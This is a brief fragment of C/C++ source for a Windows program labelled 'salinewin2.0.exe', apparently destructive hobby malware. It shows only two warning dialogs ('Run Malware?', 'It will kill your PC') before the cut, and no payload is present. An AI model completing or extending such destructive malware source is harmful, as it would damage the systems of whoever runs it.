...
{
	if (MessageBoxW(NULL, L"Run Malware?", L"salinewin2.0.exe by pankoza and MalwareRenders", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"Are you sure? It will kill your PC.", L"Last Warning.", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
